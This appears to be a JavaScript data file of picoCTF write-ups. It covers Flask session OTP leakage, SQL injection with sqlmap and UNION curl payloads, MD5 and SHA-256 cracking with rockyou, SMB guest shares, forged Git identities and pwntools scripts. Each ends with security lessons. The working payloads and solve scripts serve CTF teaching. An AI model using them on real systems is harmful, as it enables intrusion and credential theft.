picoCTF{<redacted>}
\`\`\`

## Why This Worked

The application made two critical mistakes:

1. It built SQL in \`/secrets/create\` using string interpolation.
2. It trusted database-backed tokens without any additional integrity checks.

Once arbitrary SQL execution was available, creating an admin session became easier than trying to guess the admin password.

## Security Lessons

- Never build SQL queries with string interpolation.
- Use parameterized queries consistently, especially on insert routes.
- Treat session and token tables as sensitive authentication state.
- A low-privilege SQL injection often becomes full authentication bypass.
- Knowing a fixed admin UUID or user ID can make privilege escalation trivial.

## Takeaway

This was not solved by logging in as admin directly. Instead, it was solved by creating a normal user account, abusing the SQL injection in secret creation, inserting a valid admin token into the database, and then presenting that token back to the server.

Recovered flag:

\`\`\`text
picoCTF{<redacted>}
\`\`\`
`,
  },
  {
    id: "no-fa",
    title: "No FA",
    excerpt: "picoCTF No FA writeup exploiting Flask session cookie vulnerabilities to leak OTP codes and crack passwords for authentication bypass.",
    category: "picoCTF - Web Exploitation",
    content: `# No FA

## Challenge Summary

This picoCTF challenge provided:

- A live login portal
- The application source code
- A leaked SQLite database
- Repeated hints about \`rockyou\`

Target:

\`\`\`text
http://foggy-cliff.picoctf.net:55737/login
\`\`\`

Provided files:

- \`app (1).py\`
- \`users.db\`
- \`rockyou\`

The objective was to recover the flag from the admin account.

## Initial Analysis

The leaked database contained a \`users\` table with usernames, emails, password hashes, and a \`two_fa\` flag.

The important admin row looked like this:

\`\`\`text
username: admin
email: iamadmin@nfs.com
password: c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67
two_fa: 1
\`\`\`

So admin used 2FA, while most other users did not.

## Source Code Review

The login route verified passwords with SHA-256:

\`\`\`python
if user and hashlib.sha256(password.encode()).hexdigest() == user['password']:
\`\`\`

If the user had 2FA enabled, the app generated a 4-digit OTP and stored it in the Flask session:

\`\`\`python
otp = str(random.randint(1000, 9999))
session['otp_secret'] = otp
session['otp_timestamp'] = time.time()
session['username'] = username
session['logged'] = 'false'
return redirect(url_for('two_fa'))
\`\`\`

That is the critical design flaw.

## Why This Is Vulnerable

Flask’s default session mechanism stores data on the client side in a signed cookie. The cookie is protected against modification if the secret key is unknown, but the contents are not encrypted.

That means if the server stores sensitive values such as:

- \`otp_secret\`
- \`username\`
- timestamps

inside the session, the browser can still read them.

So even without forging the session, the OTP can simply be extracted from the cookie after a successful password login.

## Step 1: Crack the Admin Password

The repeated \`rockyou\` hint strongly suggested offline password cracking.

The admin password hash from \`users.db\` was:

\`\`\`text
c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67
\`\`\`

Using \`rockyou.txt\` against SHA-256 recovered:

\`\`\`text
apple@123
\`\`\`

So the admin credentials were:

\`\`\`text
admin : apple@123
\`\`\`

## Step 2: Trigger the OTP Flow

Logging in with the recovered password redirected to \`/two_fa\` and issued a Flask session cookie.

That cookie looked like:

\`\`\`text
.eJwty0sKgCAQANC7zFoCtcnyMiE5ieAPnVbR3WvR9sG7IdUQyIOF06VBIKBy2wcdnfjDWWr9G8dMg11uYKUxWklElJPaDC6rgGtQLy7Td5zPscDzAirgHCg.abEfPw.BsVwFapCHik_B_IMNs8eow2stfY
\`\`\`

## Step 3: Decode the Flask Session Cookie

The Flask session cookie payload can be decoded without knowing the secret key.

Decoded content:

\`\`\`json
{"logged":"false","otp_secret":"4133","otp_timestamp":1773215551.660..., "username":"admin"}
\`\`\`

The key point is that the OTP was directly visible:

\`\`\`text
4133
\`\`\`

So there was no need to brute-force 2FA at all.

## Example Cookie Decoder

This is enough to extract the OTP from the session cookie:

\`\`\`python
import base64
import zlib
import json

cookie = "<session_cookie_here>"

payload = cookie.split('.')[1] if cookie.startswith('.') else cookie.split('.')[0]
raw = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))

try:
    data = zlib.decompress(raw)
except Exception:
    data = raw

print(json.loads(data))
\`\`\`

## Full Exploit Flow

A working approach:

1. Crack the leaked admin SHA-256 hash with \`rockyou\`
2. Log in as \`admin\` with \`apple@123\`
3. Read the \`session\` cookie
4. Decode the cookie and extract \`otp_secret\`
5. Submit the extracted OTP to \`/two_fa\`
6. Load \`/\` and read the flag

## Scripted Solution

\`\`\`python
import requests
import base64
import zlib
import json

BASE = "http://foggy-cliff.picoctf.net:55737"

s = requests.Session()

# Login with cracked admin password
s.post(BASE + "/login", data={
    "username": "admin",
    "password": "apple@123"
}, allow_redirects=False)

cookie = s.cookies.get("session")

# Decode OTP from Flask session cookie
payload = cookie.split('.')[1] if cookie.startswith('.') else cookie.split('.')[0]
raw = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))

try:
    data = zlib.decompress(raw)
except Exception:
    data = raw

session_data = json.loads(data)
otp = session_data["otp_secret"]

# Complete 2FA
s.post(BASE + "/two_fa", data={"otp": otp}, allow_redirects=False)

# Read flag
r = s.get(BASE + "/")
print(r.text)
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why This Worked

The challenge combined two weaknesses:

1. The leaked database exposed password hashes, allowing offline cracking.
2. The OTP secret was stored client-side in the Flask session cookie.

So even though admin had 2FA enabled, the second factor was not truly secret. Once the password was cracked, the OTP was exposed by the application itself.

## Security Lessons

- Do not store OTP secrets client-side in readable cookies.
- Signed cookies protect integrity, not confidentiality.
- Sensitive authentication state should be stored server-side.
- Leaked password databases make weak passwords trivial to recover offline.
- 2FA is ineffective if the OTP is exposed to the client before verification.

## Takeaway

This challenge was solved by combining offline password cracking with session cookie inspection. The admin password came from the leaked SHA-256 hash, and the second factor was recovered directly from the Flask session because it was only signed, not encrypted.

Recovered admin password:

\`\`\`text
apple@123
\`\`\`

Recovered flag:

\`\`\`text
picoCTF{<redacted>}
\`\`\`
`,
  },
  {
    id: "sql-map1",
    title: "Sql Map1",
    excerpt: "picoCTF SQL Map 1 writeup using sqlmap to automate SQL injection attacks and extract password hashes, then cracking them with MD5 lookup.",
    category: "picoCTF - Web Exploitation",
    content: `# Sql Map1

## Challenge Summary

This picoCTF challenge exposed a login portal and hinted very strongly at SQL injection and weak password storage.

Target:

\`\`\`text
http://lonely-island.picoctf.net:65472/
\`\`\`

Important hints:

- \`sqlmap -u <URL_for_search> --cookie="PHPSESSID=1111111111111" -p <vulnerable_parameter> --batch --tables\`
- \`Passwords should not be stored in md5 format\`

The goal was to retrieve the real flag by abusing the vulnerable search feature and then acting as a legitimate user.

## Initial Recon

The landing page was a normal login/register screen.

I first fetched the homepage to confirm the app structure and cookie behavior:

\`\`\`bash
curl -i -s http://lonely-island.picoctf.net:65472/
\`\`\`

### Why this command

- \`curl\` fetches the page directly
- \`-i\` includes response headers
- \`-s\` keeps output clean

### What it showed

- The app used PHP
- A \`PHPSESSID\` cookie was set
- The login form posted to \`login.php\`
- There was also a \`register.php\`

## Login With Known Credentials

You provided the valid credentials:

\`\`\`text
pico : pico
\`\`\`

So the next step was to authenticate and load the post-login page.

### Login request

\`\`\`bash
curl -i -s -c /tmp/sqlmap1.cookies -b /tmp/sqlmap1.cookies \\
  -d 'username=pico&password=pico' \\
  http://lonely-island.picoctf.net:65472/login.php
\`\`\`

### Why this command

- \`-c /tmp/sqlmap1.cookies\` stores the PHP session cookie
- \`-b /tmp/sqlmap1.cookies\` reuses the same cookie jar
- \`-d\` submits POST form fields

### Result

The server responded with:

\`\`\`http
Location: vuln.php
\`\`\`

That revealed the authenticated search page.

### Follow the redirect and inspect the page

\`\`\`bash
curl -s -c /tmp/sqlmap1.cookies -b /tmp/sqlmap1.cookies \\
  -d 'username=pico&password=pico' \\
  http://lonely-island.picoctf.net:65472/login.php -L | sed -n '1,220p'
\`\`\`

### Why this command

- \`-L\` follows redirects automatically
- \`sed -n '1,220p'\` limits output to the useful top portion

### What it showed

The page title was:

\`\`\`text
Vulnerable Flag Search - picoCTF2026
\`\`\`

The search form used:

\`\`\`text
GET /vuln.php?q=<search term>
\`\`\`

So the likely injection point was the \`q\` parameter.

## Baseline Search Behavior

Before attacking the parameter, I checked normal behavior.

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  'http://lonely-island.picoctf.net:65472/vuln.php?q=test' | sed -n '1,220p'
\`\`\`

### Result

The app returned:

\`\`\`text
No flags matched your search.
\`\`\`

That gave a clean baseline.

## Quick Injection Probe

Then I tested a quote:

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  'http://lonely-island.picoctf.net:65472/vuln.php?q=%27' | sed -n '1,220p'
\`\`\`

### Result

The app did not throw a visible SQL error, but the challenge hint already strongly suggested the parameter was injectable. So the next step was to use \`sqlmap\`.

## Automated Detection With sqlmap

I ran \`sqlmap\` against \`vuln.php?q=test\` and told it to test the \`q\` parameter using the authenticated \`PHPSESSID\`.

\`\`\`bash
sqlmap -u 'http://lonely-island.picoctf.net:65472/vuln.php?q=test' \\
  --cookie='PHPSESSID=9d4efd36cc8f29e077e76d6a2aa5a171' \\
  -p q \\
  --batch \\
  --tables
\`\`\`

### Why this command

- \`-u\` sets the exact vulnerable URL
- \`--cookie=...\` preserves the logged-in session
- \`-p q\` tells \`sqlmap\` which parameter to test
- \`--batch\` answers prompts automatically
- \`--tables\` asks for table enumeration

### What sqlmap found

\`sqlmap\` confirmed:

\`\`\`text
Parameter: q (GET)
Type: boolean-based blind
Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
\`\`\`

and identified the backend as:

\`\`\`text
SQLite
\`\`\`

### Why I did not rely entirely on sqlmap

The small server became unstable during time-based probing, and \`sqlmap\` failed to enumerate tables cleanly from SQLite metadata. So after confirming the injection, I switched to manual UNION-based extraction.

## Manual Column Count Discovery

To use UNION injection, I first determined the number of selected columns.

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  'http://lonely-island.picoctf.net:65472/vuln.php?q=test%27%20ORDER%20BY%201--%20-' | sed -n '1,220p'
\`\`\`

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  'http://lonely-island.picoctf.net:65472/vuln.php?q=test%27%20ORDER%20BY%202--%20-' | sed -n '1,220p'
\`\`\`

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  'http://lonely-island.picoctf.net:65472/vuln.php?q=test%27%20ORDER%20BY%203--%20-' | sed -n '1,220p'
\`\`\`

### Why these commands

\`ORDER BY n\` helps determine how many columns are in the original query:

- If \`n\` is valid, the query works
- If \`n\` is too large, the database throws an error

### Result

\`ORDER BY 3\` caused:

\`\`\`text
1st ORDER BY term out of range - should be between 1 and 2
\`\`\`

So the query had exactly **2 columns**.

## Confirm UNION Reflection

Next I checked whether UNION results were reflected into the HTML.

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  'http://lonely-island.picoctf.net:65472/vuln.php?q=test%27%20UNION%20SELECT%201,2--%20-' | sed -n '1,220p'
\`\`\`

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  'http://lonely-island.picoctf.net:65472/vuln.php?q=test%27%20UNION%20SELECT%20%27AAA%27,%27BBB%27--%20-' | sed -n '1,220p'
\`\`\`

### Result

The application rendered:

\`\`\`html
<li><strong>AAA</strong>: BBB</li>
\`\`\`

That meant both UNION-selected columns were printed. This made manual extraction easy.

## Dump Database Schema

With reflection working, I queried \`sqlite_master\` to list tables and create statements.

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  "http://lonely-island.picoctf.net:65472/vuln.php?q=test'%20UNION%20SELECT%20name,sql%20FROM%20sqlite_master%20WHERE%20type='table'--%20-" \\
  | sed -n '1,260p'
\`\`\`

### Why this command

In SQLite, \`sqlite_master\` stores schema metadata.

### Result

The database contained:

- \`users\`
- \`flags\`
- \`sqlite_sequence\`

The useful schemas were:

\`\`\`sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL
)
\`\`\`

\`\`\`sql
CREATE TABLE flags (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    key TEXT NOT NULL UNIQUE,
    value TEXT NOT NULL
)
\`\`\`

## Dump the flags Table

Now I extracted the contents of \`flags\`.

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  "http://lonely-island.picoctf.net:65472/vuln.php?q=test'%20UNION%20SELECT%20key,value%20FROM%20flags--%20-" \\
  | sed -n '1,260p'
\`\`\`

### Result

This returned multiple flag-like values:

\`\`\`text
ctf-player : picoCTF{<redacted>}
flag1      : picoCTF{<redacted>}
flag2      : picoCTF{<redacted>}
flag3      : picoCTF{<redacted>}
flag4      : picoCTF{<redacted>}
...
\`\`\`

These looked like decoys rather than the final answer.

## Dump the users Table

The challenge hint also said passwords were stored in MD5 format, so I dumped the \`users\` table.

\`\`\`bash
curl -s -b /tmp/sqlmap1.cookies \\
  "http://lonely-island.picoctf.net:65472/vuln.php?q=test'%20UNION%20SELECT%20username,password%20FROM%20users--%20-" \\
  | sed -n '1,260p'
\`\`\`

### Result

This returned users and MD5 hashes:

\`\`\`text
admin      : 5a9a79d9fa477ed163b89088681672c9
ctf-player : 7a67ab5872843b22b5e14511867c4e43
ghost      : 8d2379c40704bed972e55680be2355e2
malicious  : a669d60c31ad3d05b9e453c8576c7aab
noaccess   : 83806b490e28a7f8e6662646cbdbff1a
pico       : d3401cacf87221ecb1fe4f93b8bb90cd
suspicious : eb1f3ba6901c65d9b2e09a38f560758b
\`\`\`

At this point, the challenge hint made sense: SQL injection exposed MD5 password hashes, and one of those needed to be cracked.

## Crack the MD5 Passwords

I used \`rockyou.txt.gz\` and Python to test MD5 hashes without unpacking the wordlist.

\`\`\`bash
python3 - <<'PY'
import gzip, hashlib
hashes={
    'admin':'5a9a79d9fa477ed163b89088681672c9',
    'ctf-player':'7a67ab5872843b22b5e14511867c4e43',
    'ghost':'8d2379c40704bed972e55680be2355e2',
    'malicious':'a669d60c31ad3d05b9e453c8576c7aab',
    'noaccess':'83806b490e28a7f8e6662646cbdbff1a',
    'pico':'d3401cacf87221ecb1fe4f93b8bb90cd',
    'suspicious':'eb1f3ba6901c65d9b2e09a38f560758b',
}
rev={v:k for k,v in hashes.items()}
found={}
with gzip.open('/usr/share/wordlists/rockyou.txt.gz','rt',encoding='latin-1',errors='ignore') as f:
    for line in f:
        pwd=line.rstrip('\\n')
        h=hashlib.md5(pwd.encode()).hexdigest()
        if h in rev and rev[h] not in found:
            found[rev[h]]=pwd
            print(rev[h], pwd)
            if len(found)==len(hashes):
                break
print('found', found)
PY
\`\`\`

### Why this command

- \`gzip.open(...)\` streams the compressed wordlist directly
- \`hashlib.md5(...)\` computes candidate hashes
- This avoids creating a huge decompressed file

### Result

It recovered:

\`\`\`text
ctf-player dyesebel
pico pico
\`\`\`

The important new credential was:

\`\`\`text
ctf-player : dyesebel
\`\`\`

## Final Step: Login as the Legitimate User

The challenge statement said to retrieve the secret flag by acting as a legit user. That implied the SQLi output alone was not the final answer, and \`ctf-player\` was likely the intended account.

So I logged in as that user:

\`\`\`bash
curl -s -c /tmp/sqlmap1b.cookies -b /tmp/sqlmap1b.cookies \\
  -d 'username=ctf-player&password=dyesebel' \\
  http://lonely-island.picoctf.net:65472/login.php -L | sed -n '1,260p'
\`\`\`

### Result

The protected page displayed:

\`\`\`text
The challenge flag is:
picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Full Tooling Used

### \`curl\`

Used for:

- fetching pages
- submitting login forms
- replaying authenticated requests
- manually testing SQL injection payloads

Why it mattered:

- fast direct HTTP inspection
- easy cookie reuse
- precise GET/POST control

### \`sqlmap\`

Used for:

- confirming the parameter was injectable
- identifying the backend DBMS as SQLite

Why it mattered:

- quickly validated the challenge hint
- saved time on injection detection

Why I did not rely on it for everything:

- SQLite enumeration was unreliable on this small target
- manual UNION extraction was faster once the injection shape was known

### \`sed\`

Used to trim HTTP output:

\`\`\`bash
sed -n '1,220p'
\`\`\`

Why it mattered:

- kept responses readable
- avoided scrolling through unnecessary markup

### \`python3\`

Used to crack MD5 hashes with \`rockyou.txt.gz\`.

Why it mattered:

- easy hash testing
- direct streaming of the compressed wordlist
- enough flexibility to match multiple hashes at once

## Why the Attack Worked

The app had two independent weaknesses:

1. The authenticated search parameter \`q\` was SQL injectable.
2. User passwords were stored in raw MD5, which is weak and crackable.

SQL injection exposed the \`users\` and \`flags\` tables, but the real final flag required logging in as the legitimate user \`ctf-player\`. Cracking the MD5 hash for that account produced the password \`dyesebel\`, and that login revealed the actual flag on the protected page.

## Takeaway

This challenge was not just “dump the database and stop.” The intended path was:

1. Login as \`pico:pico\`
2. Find SQL injection in \`vuln.php?q=...\`
3. Dump \`users\` and \`flags\`
4. Crack the leaked MD5 hash for \`ctf-player\`
5. Login legitimately as \`ctf-player\`
6. Read the real flag

Final working credential:

\`\`\`text
ctf-player : dyesebel
\`\`\`

Final flag:

\`\`\`text
picoCTF{<redacted>}
\`\`\`
`,
  },
  {
    id: "printer-shares",
    title: "Printer Shares",
    excerpt: "picoCTF Printer Shares writeup enumerating SMB shares to discover and access hidden printer share files containing the flag.",
    category: "picoCTF - General Skills",
    content: `# Printer Shares

## Challenge

**Category:** General Skills  
**Name:** Printer Shares

**Prompt:**

> Oops! Someone accidentally sent an important file to a network printer—can you retrieve it from the print server?
> The printer is on \`52805\`.
> you can try \`$ nc -vz mysterious-sea.picoctf.net 52805\`

## Goal

Find the exposed file on the remote print server and recover the flag.

## Initial idea

The wording mentions a **network printer** and **printer shares**. That suggests the service may expose a printer-related network share rather than a normal shell or web service.

The provided hint command checks whether the port is open:

\`\`\`bash
nc -vz mysterious-sea.picoctf.net 52805
\`\`\`

What this does:

- \`nc\` is netcat
- \`-v\` enables verbose output
- \`-z\` does a scan without sending application data

## Step 1: Verify the port is open

\`\`\`bash
nc -vz mysterious-sea.picoctf.net 52805
\`\`\`

Observed result:

\`\`\`text
mysterious-sea.picoctf.net [3.130.79.223] 52805 open
\`\`\`

This confirms something is listening on port \`52805\`.

## Step 2: Think about the protocol

A raw \`nc\` connection did not immediately print a banner, so this was probably not a simple text service.

Because the challenge title is **Printer Shares**, the next reasonable guess is **SMB/Samba** with an exposed share. SMB shares are commonly used to expose files and printers on a network.

Good tools for that:

- \`smbclient\` to list and access shares
- \`smbmap\` to enumerate permissions

## Step 3: Enumerate available SMB shares

\`\`\`bash
smbclient -N -L //mysterious-sea.picoctf.net/ -p 52805
\`\`\`

What this command means:

- \`smbclient\` is an SMB client, similar to an FTP client for Windows/Samba shares
- \`-N\` means anonymous login with no password
- \`-L\` lists available shares
- \`//mysterious-sea.picoctf.net/\` is the target host
- \`-p 52805\` tells \`smbclient\` to use the custom challenge port

Result:

\`\`\`text
Sharename       Type      Comment
---------       ----      -------
shares          Disk      Public Share With Guests
IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
\`\`\`

This is the key discovery:

- there is a share called \`shares\`
- it allows **guest** access
- that means we can likely browse files without credentials

## Step 4: List files inside the exposed share

\`\`\`bash
smbclient -N //mysterious-sea.picoctf.net/shares -p 52805 -c 'ls'
\`\`\`

What this does:

- connects directly to the \`shares\` share
- uses anonymous access
- runs the SMB command \`ls\`

Result:

\`\`\`text
  .                                   D        0
  ..                                  D        0
  dummy.txt                           N     1142
  flag.txt                            N       37
\`\`\`

Now the challenge is effectively solved:

- \`flag.txt\` is visible in the share
- so the printer or print server exposed the sensitive file directly over SMB

## Step 5: Download the flag

\`\`\`bash
smbclient -N //mysterious-sea.picoctf.net/shares -p 52805 -c 'get flag.txt'
\`\`\`

Explanation:

- \`get flag.txt\` downloads the remote file into the current local directory

Then read it:

\`\`\`bash
cat flag.txt
\`\`\`

Output:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why this works

The challenge relies on recognizing that the “printer” is actually exposing files through an SMB/Samba share.

The vulnerability is not code execution or memory corruption. It is simple **misconfiguration**:

- a guest-accessible network share existed
- the sensitive print output was stored there
- anonymous users could browse and download it

## Minimal solve path

\`\`\`bash
nc -vz mysterious-sea.picoctf.net 52805
smbclient -N -L //mysterious-sea.picoctf.net/ -p 52805
smbclient -N //mysterious-sea.picoctf.net/shares -p 52805 -c 'ls'
smbclient -N //mysterious-sea.picoctf.net/shares -p 52805 -c 'get flag.txt'
cat flag.txt
\`\`\`

## Takeaway

Not every CTF network service is meant to be attacked with exploitation payloads. Sometimes the whole challenge is identifying the protocol correctly and using the right client tool. Here, the important skill was recognizing an exposed SMB share on a non-standard port and pulling the leaked file from it.
`,
  },
  {
    id: "my-git",
    title: "MY GIT",
    excerpt: "picoCTF My Git writeup forging a Git commit identity to bypass repository validation checks and retrieve the flag.",
    category: "picoCTF - General Skills",
    content: `# MY GIT

## Challenge

**Category:** General Skills  
**Name:** MY GIT

**Prompt:**

> I have built my own Git server with my own rules!
> You can clone the challenge repo using the command below.
>
> \`git clone ssh://git@foggy-cliff.picoctf.net:60262/git/challenge.git\`
>
> Here's the password: \`3a51a2e1\`
> Check the README to get your flag!

## Goal

Clone the custom Git repository, understand the server's special rule, and recover the flag.

## Initial observation

The challenge title and prompt strongly suggest this is not about normal Git usage. The important phrase is:

> I have built my own Git server with my own rules!

That usually means:

- the server has custom hooks
- something interesting happens on \`push\`
- the README contains the actual hint

## Step 1: Clone the repository

\`\`\`bash
git clone ssh://git@foggy-cliff.picoctf.net:60262/git/challenge.git
\`\`\`

Because the repo is served over SSH on a custom port, Git prompts for:

- host authenticity confirmation the first time
- the password provided in the challenge

Password used:

\`\`\`text
3a51a2e1
\`\`\`

## Step 2: Read the README

\`\`\`bash
cat README.md
\`\`\`

Contents:

\`\`\`md
# MyGit

### If you want the flag, make sure to push the flag!

Only flag.txt pushed by \`\`\`root:root@picoctf\`\`\` will be updated with the flag.

GOOD LUCK!
\`\`\`

## Key insight

The server is not checking who authenticated over SSH in a secure way. Instead, it appears to trust Git metadata inside a pushed commit.

That is a mistake because Git commit metadata is user-controlled.

In Git, the following fields can be set to anything:

- author name
- author email
- committer name
- committer email

So if the custom server only checks whether the pushed commit claims to be from:

\`\`\`text
root <root@picoctf>
\`\`\`

then we can impersonate that identity trivially.

## Step 3: Create a \`flag.txt\` file

The README says the server only updates \`flag.txt\`, so we need to include that file in our commit.

\`\`\`bash
printf 'please update me\\n' > flag.txt
git add flag.txt
\`\`\`

Explanation:

- \`printf\` creates a placeholder file
- \`git add flag.txt\` stages it for commit

The contents do not matter much. The server only cares that:

- \`flag.txt\` exists in the pushed commit
- the commit appears to come from \`root@picoctf\`

## Step 4: Forge the Git identity

Make the commit with both author and committer set to the expected identity:

\`\`\`bash
GIT_AUTHOR_NAME='root' \\
GIT_AUTHOR_EMAIL='root@picoctf' \\
GIT_COMMITTER_NAME='root' \\
GIT_COMMITTER_EMAIL='root@picoctf' \\
git commit -m 'Add flag.txt for server update'
\`\`\`

What these environment variables do:

- \`GIT_AUTHOR_NAME\` sets the commit author name
- \`GIT_AUTHOR_EMAIL\` sets the commit author email
- \`GIT_COMMITTER_NAME\` sets the committer name
- \`GIT_COMMITTER_EMAIL\` sets the committer email

This works because Git does not cryptographically verify those identity fields by default.

## Step 5: Verify the forged metadata locally

\`\`\`bash
git show --quiet --format=fuller HEAD
\`\`\`

Expected output shape:

\`\`\`text
Author:     root <root@picoctf>
Commit:     root <root@picoctf>
\`\`\`

This confirms the pushed commit will claim to be from the target identity.

## Step 6: Push to the remote server

\`\`\`bash
git push origin master
\`\`\`

Use the same SSH password again when prompted:

\`\`\`text
3a51a2e1
\`\`\`

## Server response

The remote hook responded with:

\`\`\`text
remote: Author matched and flag.txt found in commit...
remote: Congratulations! You have successfully impersonated the root user
remote: Here's your flag: picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why this works

The vulnerability is **trusting unauthenticated Git metadata**.

The server should have verified identity using something stronger, such as:

- authenticated SSH account mapping
- signed commits
- server-side authorization rules not based on author strings

Instead, it trusted fields that the attacker fully controls.

That allowed us to impersonate:

\`\`\`text
root <root@picoctf>
\`\`\`

without actually logging in as root.

## Minimal solve path

\`\`\`bash
git clone ssh://git@foggy-cliff.picoctf.net:60262/git/challenge.git
cd challenge
cat README.md
printf 'please update me\\n' > flag.txt
git add flag.txt
GIT_AUTHOR_NAME='root' GIT_AUTHOR_EMAIL='root@picoctf' GIT_COMMITTER_NAME='root' GIT_COMMITTER_EMAIL='root@picoctf' git commit -m 'Add flag.txt for server update'
git push origin master
\`\`\`

## Takeaway

Git commit identity is not proof of authorship. If a server makes authorization decisions based only on author or committer name/email fields, it is vulnerable to impersonation.
`,
  },
  {
    id: "bytemancy-3",
    title: "bytemancy 3",
    excerpt: "picoCTF Bytemancy 3 writeup using objdump disassembly and pwntools p32 packing to reconstruct data from binary sections and extract the flag.",
    category: "picoCTF - General Skills",
    content: `# bytemancy 3

## Challenge

**Category:** General Skills  
**Name:** bytemancy 3

**Prompt summary:**

- source code provided as \`app.py\`
- binary provided as \`spellbook\`
- connect with:

\`\`\`bash
nc green-hill.picoctf.net 56727
\`\`\`

- hint says to use \`pwnlib.util.packing.p32()\`
- hint also says \`objdump -t spellbook\` reveals the symbol table

## Goal

Send the correct function addresses as **4 raw bytes in little-endian order** for the procedures the server asks about.

## Step 1: Read the Python source

The challenge wrapper makes the task very explicit:

\`\`\`python
SPELLBOOK_FUNCTIONS = [
    "ember_sigil",
    "glyph_conflux",
    "astral_spark",
    "binding_word",
]
\`\`\`

Each round the server:

1. randomly picks 3 of those 4 names
2. looks up the function address inside the local ELF
3. converts the address with \`p32(target_addr)\`
4. expects us to send exactly those 4 bytes

Critical line:

\`\`\`python
expected_bytes = p32(target_addr)
\`\`\`

That means:

- \`p32()\` packs a 32-bit integer
- on x86 this becomes **little-endian**
- we must send raw bytes, not the address as text like \`0x8049176\`

## Step 2: Extract the symbol addresses from the binary

Use the symbol table:

\`\`\`bash
objdump -t spellbook
\`\`\`

Relevant entries:

\`\`\`text
08049176 g     F .text  00000024 ember_sigil
0804919a g     F .text  00000027 glyph_conflux
080491c1 g     F .text  00000022 astral_spark
080491e3 g     F .text  00000031 binding_word
\`\`\`

So the addresses are:

- \`ember_sigil\` = \`0x08049176\`
- \`glyph_conflux\` = \`0x0804919a\`
- \`astral_spark\` = \`0x080491c1\`
- \`binding_word\` = \`0x080491e3\`

## Step 3: Convert them to raw little-endian bytes

Using \`p32()\`:

\`\`\`python
from pwn import p32

print(p32(0x08049176).hex())  # 76910408
print(p32(0x0804919a).hex())  # 9a910408
print(p32(0x080491c1).hex())  # c1910408
print(p32(0x080491e3).hex())  # e3910408
\`\`\`

So the byte mappings are:

- \`ember_sigil\` -> \`76 91 04 08\`
- \`glyph_conflux\` -> \`9a 91 04 08\`
- \`astral_spark\` -> \`c1 91 04 08\`
- \`binding_word\` -> \`e3 91 04 08\`

These are the exact raw bytes that must be sent.

## Step 4: Automate the interaction

Because the server asks for 3 random names, the easiest solution is to script it.

Exploit script:

\`\`\`python
from pwn import remote, p32

mapping = {
    b'ember_sigil': p32(0x8049176),
    b'glyph_conflux': p32(0x804919a),
    b'astral_spark': p32(0x80491c1),
    b'binding_word': p32(0x80491e3),
}

io = remote('green-hill.picoctf.net', 56727)

for _ in range(3):
    line = io.recvline_contains(b"address for procedure '")
    name = line.split(b"'")[1]
    io.recvuntil(b'==> ')
    io.send(mapping[name])

print(io.recvall(timeout=3).decode('latin1', 'replace'))
\`\`\`

## Step 5: Recover the flag

Running the script returned:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why this works

The challenge is testing three simple binary-reversing skills:

1. identify symbols in an ELF with \`objdump -t\`
2. understand little-endian byte order
3. send binary data, not text

If you type \`0x08049176\` into netcat, that is wrong because the program expects:

\`\`\`text
\\x76\\x91\\x04\\x08
\`\`\`

as four raw bytes.

## Minimal solve path

\`\`\`bash
objdump -t spellbook | rg 'ember_sigil|glyph_conflux|astral_spark|binding_word'
python3 solve.py
\`\`\`

Where \`solve.py\` contains the script above.

## Takeaway

When a binary or service asks for an address, always check whether it wants:

- the human-readable address string
- or the packed byte representation

Here it specifically wanted the packed 32-bit little-endian form, which is exactly what \`p32()\` is for.
`,
  },
  {
    id: "printer-shares-3",
    title: "Printer Shares 3",
    excerpt: "picoCTF Printer Shares 3 writeup discovering a writable cron job script on a printer share and exploiting it for remote code execution to capture the flag.",
    category: "picoCTF - General Skills",
    content: `# Printer Shares 3

## Challenge

**Category:** General Skills  
**Name:** Printer Shares 3

**Prompt:**

> I accidentally left the debug script in place… Well, I think that's fine - No one could possibly access my super secure directory
> two printers are on \`56098\`, one private, one public.
> you can try \`$ nc -vz dolphin-cove.picoctf.net 56098\`

Additional hint:

> a suspicious script is running every minute, this script runs every minute, you might need to wait for a while

## Goal

Access the private printer data indirectly through the public share and recover the flag.

## Initial idea

This challenge is clearly related to the earlier SMB printer share tasks:

- there are two shares: one public and one private
- a script runs every minute
- a debug script was “left in place”

That strongly suggests:

1. the public share is reachable anonymously
2. the public share contains a script
3. that script is being executed by cron
4. if the share is writable, we can replace the script and make cron read the private directory for us

## Step 1: Verify the port is open

\`\`\`bash
nc -vz dolphin-cove.picoctf.net 56098
\`\`\`

Result:

\`\`\`text
dolphin-cove.picoctf.net [3.13.34.175] 56098 open
\`\`\`

## Step 2: Enumerate SMB shares

Because this is a printer/share challenge, try SMB enumeration first:

\`\`\`bash
smbclient -N -L //dolphin-cove.picoctf.net/ -p 56098
\`\`\`

Explanation:

- \`smbclient\` is an SMB client
- \`-N\` means anonymous login
- \`-L\` lists shares
- \`-p 56098\` uses the custom challenge port

Result:

\`\`\`text
Sharename       Type      Comment
---------       ----      -------
